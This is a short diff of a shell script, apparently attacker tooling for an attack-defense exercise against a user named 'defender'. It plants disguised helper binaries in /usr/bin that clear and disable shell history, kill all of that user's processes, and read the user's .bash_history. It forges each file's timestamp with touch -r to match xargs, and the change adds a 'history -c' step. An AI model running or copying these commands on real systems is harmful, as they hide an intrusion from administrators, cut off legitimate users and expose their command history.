@@ -43,7 +43,7 @@ md5sum /bin/bash
 md5sum /usr/sbin/nologin
 md5sum /usr/bin/false
 
-echo "unset HISTFILE" > /usr/bin/ww && chmod +x /usr/bin/ww && touch -r /usr/bin/xargs /usr/bin/ww
+printf "unset HISTFILE\nhistory -c\n" > /usr/bin/ww && chmod +x /usr/bin/ww && touch -r /usr/bin/xargs /usr/bin/ww
 echo "pkill -u defender" > /usr/bin/mm && chmod +x /usr/bin/mm && touch -r /usr/bin/xargs /usr/bin/mm
 echo "cat /home/defender/.bash_history" > /usr/bin/look && chmod +x /usr/bin/look && touch -r /usr/bin/xargs /usr/bin/look
 
